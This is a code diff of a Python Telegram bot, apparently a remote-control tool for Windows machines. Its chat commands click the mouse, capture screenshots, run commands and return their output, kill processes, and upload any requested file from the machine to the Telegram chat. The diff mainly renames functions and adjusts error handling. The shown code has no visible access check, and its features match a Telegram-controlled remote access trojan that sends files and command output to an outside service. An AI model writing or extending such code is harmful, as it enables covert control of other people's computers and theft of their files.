@@ -1,11 +1,14 @@
 import os
 import socket
+
+import aiogram.utils.exceptions
 import pyautogui
+import win32api
 from aiogram.dispatcher import FSMContext
 from aiogram.dispatcher.filters.state import StatesGroup, State
 from aiogram.types import Message, InputFile
 import Dispether
-from cmds import get_answer, Setup
+from cmds import GetAnswer, Setup
 from keybroadTel import keybroad
 from loader import bot, dp
 from screnslover import Make_Photo
@@ -22,7 +25,6 @@ async def clicks(message: Message):
         await bot.send_message(message.from_user.id, text='клик произведен', reply_markup=keybroad.keyboard_client)
     except Exception:
         await bot.send_message(message.from_user.id, text='ошибка', reply_markup=keybroad.keyboard_client)
-    print(message.text)
 
 
 @dp.message_handler(commands=['text'])
@@ -49,14 +51,16 @@ async def Command_start(message: Message):
 
     a = (message.text.split(' '))
     del a[0]
-    try:
-        if len(get_answer(' '.join(a))) > 4096:
-            for x in range(0, len(get_answer(' '.join(a))), 4096):
-                await bot.send_message(message.chat.id, get_answer(' '.join(a))[x:x + 4096])
-        else:
-            await bot.send_message(message.chat.id, get_answer(' '.join(a)))
-    except Exception as err:
-        await bot.send_message(err)
+
+    if len(GetAnswer(' '.join(a))) > 4096:
+        for x in range(0, len(GetAnswer(' '.join(a))), 4096):
+            await bot.send_message(message.chat.id, GetAnswer(' '.join(a))[x:x + 4096])
+    else:
+        try:
+            await bot.send_message(message.chat.id, GetAnswer(' '.join(a)))
+        except aiogram.utils.exceptions.MessageTextIsEmpty:
+            await bot.send_message(message.chat.id, "MessageTextIsEmpty")
+            print("MessageTextIsEmpty")
 
 
 @dp.message_handler(commands=['s'])
@@ -73,12 +77,6 @@ async def Command_start(message: Message):
             await bot.send_message(message.chat.id, Setup(' '.join(a)))
     except Exception:
         await bot.send_message(Exception)
-
-
-@dp.message_handler(commands=['start'])
-async def command_star(message: Message):
-    await message.reply / kill \
-        (text='привет, медвед', reply_markup=keybroad.keyboard_client)
 
 
 @dp.message_handler(commands=['exists'])
@@ -144,29 +142,29 @@ async def command_devices(message: Message):
 
     if message.text.split(" ")[0] == "убить":
         if message.text.split(" ")[1].isdigit() == False:
-            print(";d")
+
             Dispether.KillTask(message.text.split(" ")[1])
         else:
-            print("fe")
+
             Dispether.KillTaskInt(int(message.text.split(" ")[1]))
 
     if message.text.split(" ")[0] == "отправить":
-
-        bot.send_document(message.chat.id,open( message.text.split(" ")[1]))
+        bot.send_document(message.chat.id, open(message.text.split(" ")[1]))
 
     if message.text == "функции":
         pass
 
     else:
         pass
+
+
 async def Directory(command, message):
-    print(command)
-    if len(get_answer(' '.join(command))) > 4096:
-        for x in range(0, len(get_answer(' '.join(command))), 4096):
-            await bot.send_message(message.chat.id, get_answer(' '.join(command))[x:x + 4096],
+    if len(GetAnswer(' '.join(command))) > 4096:
+        for x in range(0, len(GetAnswer(' '.join(command))), 4096):
+            await bot.send_message(message.chat.id, GetAnswer(' '.join(command))[x:x + 4096],
                                    reply_markup=keybroad.keyboard_client)
     else:
-        await bot.send_message(message.chat.id, get_answer(' '.join(command)), reply_markup=keybroad.keyboard_client)
+        await bot.send_message(message.chat.id, GetAnswer(' '.join(command)), reply_markup=keybroad.keyboard_client)
 
 
 async def on_startup():
